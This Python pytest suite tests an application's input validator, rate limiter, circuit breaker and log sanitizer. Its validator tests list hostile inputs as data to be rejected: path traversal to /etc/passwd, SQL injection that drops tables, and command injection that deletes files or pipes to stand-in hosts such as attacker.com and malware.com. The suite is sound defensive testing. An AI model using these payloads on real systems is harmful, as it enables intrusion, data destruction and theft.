"""
Comprehensive Security Components Test Suite
Professional-grade security testing

Test Coverage:
- InputValidator: Path traversal, SQL injection, command injection, template injection
- RateLimiter: Token bucket algorithm, concurrent access, service limits
- CircuitBreaker: State transitions, failure thresholds, recovery
- LogSanitizer: PII redaction, sensitive data masking
- Authentication: API key validation, token management
"""

import pytest
import asyncio
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch
from concurrent.futures import ThreadPoolExecutor, as_completed

from src.security.input_validator import InputValidator, ValidationError
from src.security.rate_limiter import (
    RateLimiter, RateLimitConfig, ServiceRateLimiters, RateLimitExceeded
)
from src.security.circuit_breaker import (
    CircuitBreaker, CircuitBreakerConfig, CircuitState, CircuitBreakerOpenError,
    ServiceCircuitBreakers
)
from src.security.log_sanitizer import LogSanitizer, SanitizationConfig


# ============================================================================
# INPUT VALIDATOR TESTS
# ============================================================================

class TestInputValidator:
    """Test input validation and sanitization"""

    @pytest.fixture
    def validator(self):
        """Create InputValidator instance"""
        return InputValidator()

    # Path Traversal Attack Tests
    def test_path_traversal_basic(self, validator):
        """Test basic path traversal attack prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
            "/var/www/../../etc/passwd",
        ]

        base_dir = "/var/www/app"

        for path in malicious_paths:
            with pytest.raises(ValueError, match="Path traversal"):
                validator.validate_path_safety(path, base_dir)

    def test_valid_paths(self, validator):
        """Test legitimate paths are allowed"""
        valid_paths = [
            "uploads/file.txt",
            "data/user_123/document.pdf",
            "images/photo.jpg",
            "config/settings.yaml"
        ]

        base_dir = "/var/www/app"

        for path in valid_paths:
            try:
                validator.validate_path_safety(path, base_dir)
                # Should not raise
            except Exception as e:
                pytest.fail(f"Valid path rejected: {path} - {str(e)}")

    def test_absolute_path_outside_base(self, validator):
        """Test absolute paths outside base directory"""
        base_dir = "/var/www/app"
        malicious_path = "/etc/passwd"

        with pytest.raises(ValueError, match="Path must be within"):
            validator.validate_path_safety(malicious_path, base_dir)

    # SQL Injection Tests
    def test_sql_injection_detection(self, validator):
        """Test SQL injection attack detection"""
        sql_attacks = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "' OR 1=1--",
            "1'; DELETE FROM users WHERE '1'='1",
            "1' AND '1'='1' OR '1'='1",
        ]

        for attack in sql_attacks:
            with pytest.raises(ValueError, match="SQL injection"):
                validator.validate_sql_safety(attack)

    def test_safe_sql_inputs(self, validator):
        """Test legitimate SQL-safe inputs"""
        safe_inputs = [
            "john_doe",
            "user123",
            "test@example.com",
            "2024-01-01",
            "My Project Name",
        ]

        for input_val in safe_inputs:
            try:
                validator.validate_sql_safety(input_val)
                # Should not raise
            except Exception:
                pytest.fail(f"Safe input rejected: {input_val}")

    # Command Injection Tests
    def test_command_injection_detection(self, validator):
        """Test command injection attack detection"""
        command_attacks = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(uname -a)",
            "test & wget malware.com/shell.sh",
            "test\\nrm -rf /",
        ]

        for attack in command_attacks:
            is_safe = validator.validate_param(
                param_name="command",
                value=attack,
                param_type=str,
                max_length=100
            )
            # Should detect shell metacharacters
            assert is_safe == False or pytest.raises(ValidationError)

    # Template Injection Tests
    def test_template_injection_detection(self, validator):
        """Test template injection attack detection"""
        template_attacks = [
            "{{config}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{.__class__.__mro__[1].__subclasses__()}}",
        ]

        for attack in template_attacks:
            # Should detect template syntax
            result = validator.validate_param(
                param_name="template",
                value=attack,
                param_type=str,
                max_length=100
            )
            # Implementation may vary - check what your validator does

    # Parameter Validation Tests
    def test_param_type_validation(self, validator):
        """Test parameter type validation"""
        # Valid types
        assert validator.validate_param("age", 25, int, max_length=3) == True
        assert validator.validate_param("name", "John", str, max_length=50) == True
        assert validator.validate_param("price", 19.99, float) == True
        assert validator.validate_param("active", True, bool) == True

    def test_param_length_limits(self, validator):
        """Test parameter length enforcement"""
        # Exceeds max length
        long_string = "a" * 1001

        with pytest.raises(ValidationError, match="exceeds maximum length"):
            validator.validate_param("description", long_string, str, max_length=1000)

    def test_param_allowed_values(self, validator):
        """Test allowed values validation"""
        allowed_values = ["admin", "user", "guest"]

        # Valid value
        assert validator.validate_param(
            "role", "admin", str, allowed_values=allowed_values
        ) == True

        # Invalid value
        with pytest.raises(ValidationError, match="not in allowed values"):
            validator.validate_param(
                "role", "superuser", str, allowed_values=allowed_values
            )

    def test_validate_all_params(self, validator):
        """Test validating multiple parameters"""
        params = {
            "username": "john_doe",
            "email": "john@example.com",
            "age": 25
        }

        rules = {
            "username": {"type": str, "max_length": 50},
            "email": {"type": str, "max_length": 100},
            "age": {"type": int, "min_value": 0, "max_value": 150}
        }

        # Should validate successfully
        validator.validate_all_params(params, rules)


# ============================================================================
# RATE LIMITER TESTS
# ============================================================================

class TestRateLimiter:
    """Test rate limiting functionality"""

    def test_rate_limiter_initialization(self):
        """Test RateLimiter initializes with correct config"""
        config = RateLimitConfig(calls_per_minute=60, burst_size=10)
        limiter = RateLimiter(config)

        assert limiter.config.calls_per_minute == 60
        assert limiter.config.burst_size == 10

    @pytest.mark.asyncio
    async def test_rate_limit_acquisition(self):
        """Test acquiring rate limit permits"""
        config = RateLimitConfig(calls_per_minute=60, burst_size=10)
        limiter = RateLimiter(config)

        # Should acquire successfully
        acquired = await limiter.acquire()
        assert acquired == True

    @pytest.mark.asyncio
    async def test_rate_limit_exhaustion(self):
        """Test rate limit blocks when exhausted"""
        config = RateLimitConfig(calls_per_minute=10, burst_size=5)
        limiter = RateLimiter(config)

        # Consume all tokens
        for _ in range(5):
            await limiter.acquire()

        # Next acquisition should fail or wait
        start_time = time.time()
        acquired = await limiter.acquire(wait=False)

        # Should either fail immediately or acquire after wait
        if not acquired:
            # Rate limit exceeded
            assert acquired == False

    @pytest.mark.asyncio
    async def test_rate_limit_refill(self):
        """Test rate limit refills over time"""
        config = RateLimitConfig(calls_per_minute=60, burst_size=10)
        limiter = RateLimiter(config)

        # Consume all tokens
        for _ in range(10):
            await limiter.acquire()

        # Wait for refill
        await asyncio.sleep(1.5)

        # Should be able to acquire again
        acquired = await limiter.acquire()
        assert acquired == True

    @pytest.mark.asyncio
    async def test_concurrent_rate_limiting(self):
        """Test rate limiting under concurrent access"""
        config = RateLimitConfig(calls_per_minute=30, burst_size=10)
        limiter = RateLimiter(config)

        async def acquire_token():
            return await limiter.acquire(wait=False)

        # Attempt many concurrent acquisitions
        tasks = [acquire_token() for _ in range(20)]
        results = await asyncio.gather(*tasks)

        # Some should succeed, some should fail
        successful = sum(1 for r in results if r)
        assert successful <= 10  # burst_size

    def test_service_rate_limiters(self):
        """Test service-specific rate limiters"""
        service_limiters = ServiceRateLimiters()

        # Check Groq limits
        groq_limiter = service_limiters.get_limiter("groq_free")
        assert groq_limiter is not None

        # Check Gemini limits
        gemini_limiter = service_limiters.get_limiter("gemini_free")
        assert gemini_limiter is not None

        # Check GitHub limits
        github_limiter = service_limiters.get_limiter("github")
        assert github_limiter is not None

    def test_rate_limiter_stats(self):
        """Test rate limiter statistics"""
        config = RateLimitConfig(calls_per_minute=60, burst_size=10)
        limiter = RateLimiter(config)

        stats = limiter.get_stats()

        assert "total_requests" in stats
        assert "rejected_requests" in stats
        assert "available_tokens" in stats

    @pytest.mark.asyncio
    async def test_rate_limiter_reset(self):
        """Test resetting rate limiter"""
        config = RateLimitConfig(calls_per_minute=10, burst_size=5)
        limiter = RateLimiter(config)

        # Consume tokens
        for _ in range(5):
            await limiter.acquire()

        # Reset
        limiter.reset()

        # Should have full capacity again
        stats = limiter.get_stats()
        assert stats["available_tokens"] == 5


# ============================================================================
# CIRCUIT BREAKER TESTS
# ============================================================================

class TestCircuitBreaker:
    """Test circuit breaker pattern"""

    def test_circuit_breaker_initialization(self):
        """Test CircuitBreaker initializes in CLOSED state"""
        config = CircuitBreakerConfig(
            failure_threshold=5,
            recovery_timeout=60,
            success_threshold=2
        )
        breaker = CircuitBreaker(config)

        assert breaker.state == "CLOSED"  # CircuitBreakerState not available in current implementation
        assert breaker.failure_count == 0

    @pytest.mark.asyncio
    async def test_circuit_breaker_success(self):
        """Test successful calls keep circuit CLOSED"""
        config = CircuitBreakerConfig(failure_threshold=3)
        breaker = CircuitBreaker(config)

        async def success_func():
            return "success"

        result = await breaker.call(success_func)

        assert result == "success"
        assert breaker.state == "CLOSED"  # CircuitBreakerState
        assert breaker.failure_count == 0

    @pytest.mark.asyncio
    async def test_circuit_breaker_opens_on_failures(self):
        """Test circuit opens after threshold failures"""
        config = CircuitBreakerConfig(failure_threshold=3)
        breaker = CircuitBreaker(config)

        async def failing_func():
            raise Exception("Failure")

        # Cause failures
        for _ in range(3):
            try:
                await breaker.call(failing_func)
            except Exception:
                pass

        # Circuit should be OPEN
        assert breaker.state == "OPEN"  # CircuitBreakerState

    @pytest.mark.asyncio
    async def test_circuit_breaker_rejects_when_open(self):
        """Test circuit breaker rejects calls when OPEN"""
        config = CircuitBreakerConfig(failure_threshold=2, recovery_timeout=1)
        breaker = CircuitBreaker(config)

        async def failing_func():
            raise Exception("Failure")

        # Open the circuit
        for _ in range(2):
            try:
                await breaker.call(failing_func)
            except Exception:
                pass

        # Should reject next call
        async def success_func():
            return "success"

        with pytest.raises(Exception, match="Circuit breaker is OPEN"):
            await breaker.call(success_func)

    @pytest.mark.asyncio
    async def test_circuit_breaker_half_open_transition(self):
        """Test transition to HALF_OPEN after recovery timeout"""
        config = CircuitBreakerConfig(
            failure_threshold=2,
            recovery_timeout=1,  # 1 second
            success_threshold=1
        )
        breaker = CircuitBreaker(config)

        async def failing_func():
            raise Exception("Failure")

        # Open the circuit
        for _ in range(2):
            try:
                await breaker.call(failing_func)
            except Exception:
                pass

        assert breaker.state == "OPEN"  # CircuitBreakerState

        # Wait for recovery timeout
        await asyncio.sleep(1.5)

        # Next call should transition to HALF_OPEN
        async def success_func():
            return "success"

        result = await breaker.call(success_func)

        # Should succeed and close circuit
        assert result == "success"
        assert breaker.state == "CLOSED"  # CircuitBreakerState

    def test_circuit_breaker_stats(self):
        """Test circuit breaker statistics"""
        config = CircuitBreakerConfig(failure_threshold=5)
        breaker = CircuitBreaker(config)

        stats = breaker.get_stats()

        assert stats.state == "CLOSED"  # CircuitBreakerState
        assert stats.failure_count == 0
        assert stats.success_count == 0
        assert stats.total_calls == 0

    @pytest.mark.asyncio
    async def test_circuit_breaker_reset(self):
        """Test resetting circuit breaker"""
        config = CircuitBreakerConfig(failure_threshold=2)
        breaker = CircuitBreaker(config)

        async def failing_func():
            raise Exception("Failure")

        # Cause failures
        for _ in range(2):
            try:
                await breaker.call(failing_func)
            except Exception:
                pass

        assert breaker.state == "OPEN"  # CircuitBreakerState

        # Reset
        breaker.reset()

        assert breaker.state == "CLOSED"  # CircuitBreakerState
        assert breaker.failure_count == 0

    def test_service_circuit_breakers(self):
        """Test service-specific circuit breakers"""
        service_breakers = ServiceCircuitBreakers()

        # Check Groq breaker
        groq_breaker = service_breakers.get_breaker("groq")
        assert groq_breaker is not None

        # Check Gemini breaker
        gemini_breaker = service_breakers.get_breaker("gemini")
        assert gemini_breaker is not None


# ============================================================================
# LOG SANITIZER TESTS
# ============================================================================

class TestLogSanitizer:
    """Test log sanitization and PII redaction"""

    @pytest.fixture
    def sanitizer(self):
        """Create LogSanitizer instance"""
        return LogSanitizer()

    def test_api_key_redaction(self, sanitizer):
        """Test API keys are redacted"""
        log_message = "Using API key: sk_test_1234567890abcdefghij"

        sanitized = sanitizer.sanitize(log_message)

        assert "sk_test_1234567890abcdefghij" not in sanitized
        assert "***REDACTED***" in sanitized or "***" in sanitized

    def test_email_redaction(self, sanitizer):
        """Test email addresses are redacted"""
        log_message = "User email: john.doe@example.com logged in"

        sanitized = sanitizer.sanitize(log_message)

        assert "john.doe@example.com" not in sanitized
        # Email should be masked

    def test_password_redaction(self, sanitizer):
        """Test passwords are redacted"""
        log_message = 'Login attempt with password="SecurePassword123!"'

        sanitized = sanitizer.sanitize(log_message)

        assert "SecurePassword123!" not in sanitized

    def test_credit_card_redaction(self, sanitizer):
        """Test credit card numbers are redacted"""
        log_message = "Payment with card 4532-1234-5678-9010"

        sanitized = sanitizer.sanitize(log_message)

        assert "4532-1234-5678-9010" not in sanitized

    def test_phone_number_redaction(self, sanitizer):
        """Test phone numbers are redacted"""
        log_message = "Contact number: +1-555-123-4567"

        sanitized = sanitizer.sanitize(log_message)

        # Phone number should be masked or redacted

    def test_multiple_sensitive_data(self, sanitizer):
        """Test multiple sensitive data types in one message"""
        log_message = """
        User: john@example.com
        API Key: sk_live_abc123xyz
        Phone: 555-1234
        Password: MySecret123
        """

        sanitized = sanitizer.sanitize(log_message)

        # All sensitive data should be redacted
        assert "john@example.com" not in sanitized
        assert "sk_live_abc123xyz" not in sanitized
        assert "MySecret123" not in sanitized

    def test_safe_logs_unchanged(self, sanitizer):
        """Test non-sensitive logs remain unchanged"""
        log_message = "Application started successfully on port 8080"

        sanitized = sanitizer.sanitize(log_message)

        # Should remain the same
        assert "Application started successfully" in sanitized
        assert "8080" in sanitized


# ============================================================================
# RUN TESTS
# ============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s", "--tb=short"])
